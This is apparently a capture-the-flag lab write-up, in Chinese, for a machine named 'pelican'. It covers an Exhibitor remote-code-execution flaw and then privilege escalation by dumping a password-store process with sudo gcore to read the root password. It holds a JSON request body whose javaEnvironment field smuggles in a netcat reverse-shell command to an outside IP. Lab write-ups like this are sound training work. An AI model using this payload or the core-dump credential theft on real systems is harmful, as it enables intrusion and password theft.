<img width="1918" height="752" alt="image" src="https://github.com/user-attachments/assets/d25d2edb-4797-48b8-8587-41ab28eb25ac" />## nmap scanning
- <img width="1918" height="662" alt="image" src="https://github.com/user-attachments/assets/2fa7af84-1a3a-4078-a3dc-c3ad526cb330" />

## 8080、8081 port
- 8081 port 會導向到 http://pelican:8080/exhibitor/v1/ui/index.html
  - <img width="1918" height="528" alt="image" src="https://github.com/user-attachments/assets/9047d8d5-b506-44a4-894d-bf8f3f6e72f7" />
- exhibitor 存在 rce 漏洞
  - https://www.exploit-db.com/exploits/48654
- 用 github 的 poc
  - https://github.com/thehunt1s0n/Exihibitor-RCE
- burp suite
  - 把 json 程式碼 copy 到 boby
    ```
    {"zookeeperInstallDirectory":"/opt/zookeeper","zookeeperDataDirectory":"/zookeeper/data","zookeeperLogDirectory":"","logIndexDirectory":"","autoManageInstancesSettlingPeriodMs":"10000","autoManageInstancesFixedEnsembleSize":"0","autoManageInstancesApplyAllAtOnce":"1","observerThreshold":"3","serversSpec":"1:pelican","javaEnvironment":"$(/bin/nc -e /bin/sh '192.168.45.193' '6666' &)","log4jProperties":"","clientPort":"2181","connectPort":"2888","electionPort":"3888","checkMs":"2000","cleanupPeriodMs":"200000","cleanupMaxFiles":"10","backupPeriodMs":"60000","backupMaxStoreMs":"86400000","autoManageInstances":"1","zooCfgExtra":{"syncLimit":"5","tickTime":"2000","initLimit":"10"},"backupExtra":{},"serverId":1}
    ```
    - <img width="1540" height="777" alt="image" src="https://github.com/user-attachments/assets/80d258c4-2107-4eca-b9d7-feb0d23a950b" />
- 成功取得 shell
  - <img width="1767" height="813" alt="image" src="https://github.com/user-attachments/assets/927fe432-fa85-40f2-b472-ff7bcd7fc65f" />
- 取得 local.txt
  - <img width="1088" height="75" alt="image" src="https://github.com/user-attachments/assets/0168333b-7d0e-459a-801d-ce51e2ca0935" />

## 提權
- charles 可以 sudo 用 root 執行 gcore
  - <img width="1327" height="195" alt="image" src="https://github.com/user-attachments/assets/1fa9c6aa-b175-4df0-b955-c37897b1f4f6" />
- GTFOBins 
  - <img width="1237" height="260" alt="image" src="https://github.com/user-attachments/assets/9a620af3-edd6-4383-8ba3-772e4b29586c" />
- ps aux 發現有個 process 為 /usr/bin/password-store
  - <img width="1918" height="752" alt="image" src="https://github.com/user-attachments/assets/6e940ca4-e9e2-45ad-95b3-c7dbfd2f8310" />
  - <img width="1463" height="127" alt="image" src="https://github.com/user-attachments/assets/2a726b50-1d8d-4fa2-98b9-a66cf909d189" />
- gcore 可以藉由 pid 建立一份核心傾印檔，之後再利用 strings 查看 process 的內容
  - <img width="1918" height="175" alt="image" src="https://github.com/user-attachments/assets/af4b0c78-fa22-492d-9801-23a48a4f0eb6" />
- strings core.513 發現 root 的密碼
  - <img width="1918" height="740" alt="image" src="https://github.com/user-attachments/assets/0f3407e9-b6cf-40d5-99ec-1cc79d6dfb3d" />
- 成功提權
  - <img width="1047" height="210" alt="image" src="https://github.com/user-attachments/assets/28306f4a-e4f2-4142-9729-ec446df47147" />
- 取得 proof.txt
  - <img width="817" height="112" alt="image" src="https://github.com/user-attachments/assets/b5970971-21a1-4b8d-bc23-09c016384720" />

















































